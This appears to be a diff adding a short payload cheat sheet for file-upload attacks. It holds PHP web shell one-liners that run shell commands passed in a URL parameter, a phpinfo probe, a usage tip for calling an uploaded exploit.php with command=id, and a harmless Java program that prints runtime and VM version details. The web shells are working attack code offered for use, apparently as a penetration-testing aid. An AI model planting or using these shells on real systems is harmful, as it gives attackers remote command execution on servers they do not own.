@@ -1,0 +1,22 @@
+<?php echo system($_GET['command']); ?>				if it is uploaded try to access "/example/exploit.php?command=id"
+<?php phpinfo(); ?>
+<?php echo system('id'); ?>
+<?php echo shell_exec($_GET[‘e’].’ 2>&1'); ?>
+
+
+java 
+public class JavaInfo {
+    public static void main(String[] args) {
+        // Print Java version
+        System.out.println("Java Version: " + System.getProperty("java.version"));
+
+        // Print Java Runtime information
+        System.out.println("Java Runtime: " + System.getProperty("java.runtime.name"));
+        System.out.println("Java Runtime Version: " + System.getProperty("java.runtime.version"));
+
+        // Print Java VM information
+        System.out.println("Java VM: " + System.getProperty("java.vm.name"));
+        System.out.println("Java VM Version: " + System.getProperty("java.vm.version"));
+        System.out.println("Java VM Vendor: " + System.getProperty("java.vm.vendor"));
+    }
+}
